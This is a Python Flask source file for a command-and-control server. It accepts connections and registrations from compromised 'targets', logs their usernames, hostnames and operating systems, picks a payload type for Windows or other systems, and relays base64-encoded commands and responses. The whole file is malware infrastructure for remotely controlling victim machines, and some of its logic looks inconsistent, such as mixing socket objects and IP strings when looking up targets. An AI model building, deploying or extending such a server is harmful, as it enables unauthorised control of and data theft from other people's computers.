from flask import Flask, request, jsonify
import socket
import threading
import time
from datetime import datetime
import base64

app = Flask(__name__)

targets = []
listener_counter = 0
kill_flag = 0

def comm_in(data):
    return base64.b64decode(data).decode('utf-8')

def comm_out(message):
    return base64.b64encode(message.encode('utf-8')).decode('utf-8')

def listener_handler(host_ip, host_port):
    global listener_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host_ip, int(host_port)))
    sock.listen()
    threading.Thread(target=comm_handler, args=(sock,)).start()
    listener_counter += 1

def comm_handler(sock):
    global targets
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = comm_in(remote_target.recv(1024).decode())
            op_sys = comm_in(remote_target.recv(1024).decode())
            pay_val = 1 if 'Windows' in op_sys else 2
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
            host_name = socket.gethostbyaddr(remote_ip[0])[0] if socket.gethostbyaddr(remote_ip[0]) else remote_ip[0]
            targets.append([remote_target, f"{host_name}@{remote_ip[0]}", time_record, username, op_sys, pay_val, 'Active'])
        except:
            pass

@app.route('/')
def index():
    return "C2 Server is running."

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.json
        print(f"Received registration data: {data}")
        remote_ip = request.remote_addr
        username = comm_in(data['username'])
        op_sys = comm_in(data['os'])
        pay_val = 1 if 'Windows' in op_sys else 2
        cur_time = time.strftime("%H:%M:%S", time.localtime())
        date = datetime.now()
        time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"
        host_name = socket.gethostbyaddr(remote_ip)[0] if socket.gethostbyaddr(remote_ip) else remote_ip
        targets.append([remote_ip, f"{host_name}@{remote_ip}", time_record, username, op_sys, pay_val, 'Active'])
        return jsonify({"message": "Registered successfully."})
    except Exception as e:
        print(f"Error during registration: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/command/<target_ip>', methods=['POST'])
def send_command(target_ip):
    data = request.json
    command = comm_out(data['command'])
    target = next((t for t in targets if t[0] == target_ip), None)
    if not target:
        return jsonify({"error": "Target not found"}), 404
    # Send command to target
    target[0].send(command)
    return jsonify({"message": "Command sent"})

@app.route('/response/<target_ip>', methods=['POST'])
def get_response(target_ip):
    data = request.json
    response = comm_in(data['response'])
    # Process response from target
    return jsonify({"message": "Response received", "response": response})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
